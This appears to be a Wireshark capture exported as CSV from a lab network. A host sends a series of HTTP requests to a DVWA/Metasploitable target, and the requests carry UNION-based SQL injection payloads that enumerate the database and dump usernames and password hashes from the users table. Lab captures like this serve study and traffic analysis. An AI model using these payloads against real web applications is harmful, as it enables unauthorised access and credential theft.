"No.","Time","Source","Destination","Protocol","Length","Info"
"248","401.297275640","10.0.2.4","10.0.2.5","TCP","2962","80  >  36916 [ACK] Seq=1 Ack=606 Win=7040 Len=2896 TSval=66018 TSecr=3495669596 [TCP segment of a reassembled PDU]"
"249","401.297311319","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=606 Ack=2897 Win=31872 Len=0 TSval=3495669609 TSecr=66018"
"250","401.297814752","10.0.2.4","10.0.2.5","HTTP","2178","HTTP/1.1 200 OK  (text/html)"
"251","401.297836122","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=606 Ack=5009 Win=31872 Len=0 TSval=3495669610 TSecr=66018"
"252","401.298309619","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [FIN, ACK] Seq=606 Ack=5009 Win=31872 Len=0 TSval=3495669610 TSecr=66018"
"253","401.298886497","10.0.2.4","10.0.2.5","TCP","66","80  >  36916 [FIN, ACK] Seq=5009 Ack=607 Win=7040 Len=0 TSval=66018 TSecr=3495669610"
"254","401.298891504","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=607 Ack=5010 Win=31872 Len=0 TSval=3495669611 TSecr=66018"
"255","406.324161029","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"256","406.324675682","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"257","418.165253331","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"258","418.165517959","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"259","418.244882252","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=49 Ack=57 Win=32578 Len=0"
"260","423.219450797","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"261","423.220023463","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"262","460.143762242","10.0.2.5","10.0.2.4","TCP","74","47130  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495728456 TSecr=0 WS=128"
"263","460.144331281","10.0.2.4","10.0.2.5","TCP","74","80  >  47130 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=71901 TSecr=3495728456 WS=128"
"264","460.144369432","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495728456 TSecr=71901"
"265","460.144542238","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+version(),2--+&Submit=Submit HTTP/1.1 "
"266","460.144916214","10.0.2.4","10.0.2.5","TCP","66","80  >  47130 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=71901 TSecr=3495728456"
"267","460.155285115","10.0.2.4","10.0.2.5","TCP","4410","80  >  47130 [ACK] Seq=1 Ack=530 Win=6912 Len=4344 TSval=71902 TSecr=3495728456 [TCP segment of a reassembled PDU]"
"268","460.155311755","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495728467 TSecr=71902"
"269","460.155842920","10.0.2.4","10.0.2.5","HTTP","579","HTTP/1.1 200 OK  (text/html)"
"270","460.155862119","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495728468 TSecr=71902"
"271","460.156323002","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [FIN, ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495728468 TSecr=71902"
"272","460.156928623","10.0.2.4","10.0.2.5","TCP","66","80  >  47130 [FIN, ACK] Seq=4858 Ack=531 Win=6912 Len=0 TSval=71903 TSecr=3495728468"
"273","460.156935133","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=531 Ack=4859 Win=31872 Len=0 TSval=3495728469 TSecr=71903"
"274","465.202976466","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"275","465.204113381","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"276","472.463113573","10.0.2.5","10.0.2.4","TCP","74","41528  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495740775 TSecr=0 WS=128"
"277","472.463763759","10.0.2.4","10.0.2.5","TCP","74","80  >  41528 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=73133 TSecr=3495740775 WS=128"
"278","472.463795945","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495740776 TSecr=73133"
"279","472.466473436","10.0.2.5","10.0.2.4","HTTP","596","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+database(),2--+&Submit=Submit HTTP/1.1 "
"280","472.467096471","10.0.2.4","10.0.2.5","TCP","66","80  >  41528 [ACK] Seq=1 Ack=531 Win=6912 Len=0 TSval=73133 TSecr=3495740778"
"281","472.476241714","10.0.2.4","10.0.2.5","TCP","4410","80  >  41528 [ACK] Seq=1 Ack=531 Win=6912 Len=4344 TSval=73134 TSecr=3495740778 [TCP segment of a reassembled PDU]"
"282","472.476279419","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=531 Ack=4345 Win=31872 Len=0 TSval=3495740788 TSecr=73134"
"283","472.477053895","10.0.2.4","10.0.2.5","HTTP","569","HTTP/1.1 200 OK  (text/html)"
"284","472.477060506","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=531 Ack=4848 Win=31872 Len=0 TSval=3495740789 TSecr=73134"
"285","472.481942053","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [FIN, ACK] Seq=531 Ack=4848 Win=31872 Len=0 TSval=3495740794 TSecr=73134"
"286","472.482759188","10.0.2.4","10.0.2.5","TCP","66","80  >  41528 [FIN, ACK] Seq=4848 Ack=532 Win=6912 Len=0 TSval=73135 TSecr=3495740794"
"287","472.482768574","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=532 Ack=4849 Win=31872 Len=0 TSval=3495740795 TSecr=73135"
"288","478.815893139","10.0.2.5","10.0.2.4","TCP","74","38550  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495747128 TSecr=0 WS=128"
"289","478.816516199","10.0.2.4","10.0.2.5","TCP","74","80  >  38550 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=73768 TSecr=3495747128 WS=128"
"290","478.816528490","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495747128 TSecr=73768"
"291","478.818192188","10.0.2.5","10.0.2.4","HTTP","592","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+user(),2--+&Submit=Submit HTTP/1.1 "
"292","478.818451161","10.0.2.4","10.0.2.5","TCP","66","80  >  38550 [ACK] Seq=1 Ack=527 Win=6912 Len=0 TSval=73768 TSecr=3495747130"
"293","478.827835532","10.0.2.4","10.0.2.5","TCP","4410","80  >  38550 [ACK] Seq=1 Ack=527 Win=6912 Len=4344 TSval=73769 TSecr=3495747130 [TCP segment of a reassembled PDU]"
"294","478.827870075","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=527 Ack=4345 Win=31872 Len=0 TSval=3495747140 TSecr=73769"
"295","478.828217529","10.0.2.4","10.0.2.5","HTTP","571","HTTP/1.1 200 OK  (text/html)"
"296","478.828220875","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=527 Ack=4850 Win=31872 Len=0 TSval=3495747140 TSecr=73769"
"297","478.831129446","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [FIN, ACK] Seq=527 Ack=4850 Win=31872 Len=0 TSval=3495747143 TSecr=73769"
"298","478.831685445","10.0.2.4","10.0.2.5","TCP","66","80  >  38550 [FIN, ACK] Seq=4850 Ack=528 Win=6912 Len=0 TSval=73770 TSecr=3495747143"
"299","478.831696899","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=528 Ack=4851 Win=31872 Len=0 TSval=3495747144 TSecr=73770"
"300","505.758128411","fe80::ce8b:2371:92ee:4afb","ff02::2","ICMPv6","62","Router Solicitation"
"301","520.391913151","PcsCompu_a3:ab:42","Broadcast","ARP","60","Who has 10.0.2.3? Tell 10.0.2.4"
"302","524.113384030","10.0.2.5","10.0.2.4","TCP","74","47860  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495792425 TSecr=0 WS=128"
"303","524.113958606","10.0.2.4","10.0.2.5","TCP","74","80  >  47860 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=78297 TSecr=3495792425 WS=128"
"304","524.113970376","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495792426 TSecr=78297"
"305","524.114816847","10.0.2.5","10.0.2.4","HTTP","668","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(column_name),2+from+information_schema.columns+where+table_name='users'--+&Submit=Submit HTTP/1.1 "
"306","524.115377474","10.0.2.4","10.0.2.5","TCP","66","80  >  47860 [ACK] Seq=1 Ack=603 Win=7040 Len=0 TSval=78297 TSecr=3495792427"
"307","524.125319274","10.0.2.4","10.0.2.5","TCP","4410","80  >  47860 [ACK] Seq=1 Ack=603 Win=7040 Len=4344 TSval=78298 TSecr=3495792427 [TCP segment of a reassembled PDU]"
"308","524.125337180","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=603 Ack=4345 Win=31872 Len=0 TSval=3495792437 TSecr=78298"
"309","524.125831433","10.0.2.4","10.0.2.5","HTTP","758","HTTP/1.1 200 OK  (text/html)"
"310","524.125837624","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=603 Ack=5037 Win=31872 Len=0 TSval=3495792438 TSecr=78298"
"311","524.128177852","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [FIN, ACK] Seq=603 Ack=5037 Win=31872 Len=0 TSval=3495792440 TSecr=78298"
"312","524.128835752","10.0.2.4","10.0.2.5","TCP","66","80  >  47860 [FIN, ACK] Seq=5037 Ack=604 Win=7040 Len=0 TSval=78298 TSecr=3495792440"
"313","524.128856256","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=604 Ack=5038 Win=31872 Len=0 TSval=3495792441 TSecr=78298"
"314","529.202725399","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"315","529.203181128","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"316","568.279280516","10.0.2.5","10.0.2.4","TCP","74","35164  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495836591 TSecr=0 WS=128"
"317","568.279969664","10.0.2.4","10.0.2.5","TCP","74","80  >  35164 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=82712 TSecr=3495836591 WS=128"
"318","568.279983453","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495836592 TSecr=82712"
"319","568.280298210","10.0.2.5","10.0.2.4","HTTP","627","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"320","568.280712362","10.0.2.4","10.0.2.5","TCP","66","80  >  35164 [ACK] Seq=1 Ack=562 Win=7040 Len=0 TSval=82712 TSecr=3495836592"
"321","568.288486759","10.0.2.4","10.0.2.5","TCP","4410","80  >  35164 [ACK] Seq=1 Ack=562 Win=7040 Len=4344 TSval=82713 TSecr=3495836592 [TCP segment of a reassembled PDU]"
"322","568.288496301","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=562 Ack=4345 Win=31872 Len=0 TSval=3495836600 TSecr=82713"
"323","568.288953091","10.0.2.4","10.0.2.5","HTTP","796","HTTP/1.1 200 OK  (text/html)"
"324","568.288957930","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=562 Ack=5075 Win=31872 Len=0 TSval=3495836601 TSecr=82713"
"325","568.291339996","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [FIN, ACK] Seq=562 Ack=5075 Win=31872 Len=0 TSval=3495836603 TSecr=82713"
"326","568.292245812","10.0.2.4","10.0.2.5","TCP","66","80  >  35164 [FIN, ACK] Seq=5075 Ack=563 Win=7040 Len=0 TSval=82713 TSecr=3495836603"
"327","568.292256480","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=563 Ack=5076 Win=31872 Len=0 TSval=3495836604 TSecr=82713"
"328","573.490716908","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"329","573.490974495","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"330","603.475808879","10.0.2.5","10.0.2.4","TCP","74","43730  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495871788 TSecr=0 WS=128"
"331","603.476200877","10.0.2.4","10.0.2.5","TCP","74","80  >  43730 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=86231 TSecr=3495871788 WS=128"
"332","603.476211264","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495871788 TSecr=86231"
"333","603.477975239","10.0.2.5","10.0.2.4","HTTP","632","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,0x3a,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"334","603.478511446","10.0.2.4","10.0.2.5","TCP","66","80  >  43730 [ACK] Seq=1 Ack=567 Win=7040 Len=0 TSval=86231 TSecr=3495871790"
"335","603.485819117","10.0.2.4","10.0.2.5","TCP","2962","80  >  43730 [ACK] Seq=1 Ack=567 Win=7040 Len=2896 TSval=86231 TSecr=3495871790 [TCP segment of a reassembled PDU]"
"336","603.485829717","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=2897 Win=31872 Len=0 TSval=3495871798 TSecr=86231"
"337","603.485976093","10.0.2.4","10.0.2.5","TCP","1514","80  >  43730 [ACK] Seq=2897 Ack=567 Win=7040 Len=1448 TSval=86232 TSecr=3495871790 [TCP segment of a reassembled PDU]"
"338","603.485978791","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=4345 Win=31872 Len=0 TSval=3495871798 TSecr=86232"
"339","603.486282345","10.0.2.4","10.0.2.5","HTTP","811","HTTP/1.1 200 OK  (text/html)"
"340","603.486284272","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=5090 Win=31872 Len=0 TSval=3495871798 TSecr=86232"
"341","603.487529196","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [FIN, ACK] Seq=567 Ack=5090 Win=31872 Len=0 TSval=3495871799 TSecr=86232"
"342","603.487965774","10.0.2.4","10.0.2.5","TCP","66","80  >  43730 [FIN, ACK] Seq=5090 Ack=568 Win=7040 Len=0 TSval=86232 TSecr=3495871799"
"343","603.487973766","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=568 Ack=5091 Win=31872 Len=0 TSval=3495871800 TSecr=86232"
"344","661.983615402","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0xa1818954"
"345","661.991021386","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0xa1818954"
"346","667.188584345","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"347","667.189019244","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"348","678.167935832","10.0.2.5","10.0.2.4","TCP","74","36394  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495946480 TSecr=0 WS=128"
"349","678.168433192","10.0.2.4","10.0.2.5","TCP","74","80  >  36394 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=93698 TSecr=3495946480 WS=128"
"350","678.168444935","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495946480 TSecr=93698"
"351","678.169246995","10.0.2.5","10.0.2.4","HTTP","642","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,0x3a,user,0x3a,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"352","678.169825988","10.0.2.4","10.0.2.5","TCP","66","80  >  36394 [ACK] Seq=1 Ack=577 Win=7040 Len=0 TSval=93699 TSecr=3495946481"
"353","678.178118787","10.0.2.4","10.0.2.5","TCP","2962","80  >  36394 [ACK] Seq=1 Ack=577 Win=7040 Len=2896 TSval=93699 TSecr=3495946481 [TCP segment of a reassembled PDU]"
"354","678.178126944","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=2897 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"355","678.178266870","10.0.2.4","10.0.2.5","TCP","1514","80  >  36394 [ACK] Seq=2897 Ack=577 Win=7040 Len=1448 TSval=93699 TSecr=3495946481 [TCP segment of a reassembled PDU]"
"356","678.178269394","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=4345 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"357","678.178513626","10.0.2.4","10.0.2.5","HTTP","863","HTTP/1.1 200 OK  (text/html)"
"358","678.178515361","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=5142 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"359","678.179499776","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [FIN, ACK] Seq=577 Ack=5142 Win=31872 Len=0 TSval=3495946491 TSecr=93699"
"360","678.180232413","10.0.2.4","10.0.2.5","TCP","66","80  >  36394 [FIN, ACK] Seq=5142 Ack=578 Win=7040 Len=0 TSval=93700 TSecr=3495946491"
"361","678.180238976","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=578 Ack=5143 Win=31872 Len=0 TSval=3495946492 TSecr=93700"
"362","683.315426966","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"363","683.316592021","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"364","707.858190879","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"365","707.858831814","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"366","718.543801544","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"367","718.543969952","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"368","718.782059596","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=73 Ack=85 Win=32550 Len=0"
"369","723.762999933","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"370","723.763576963","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"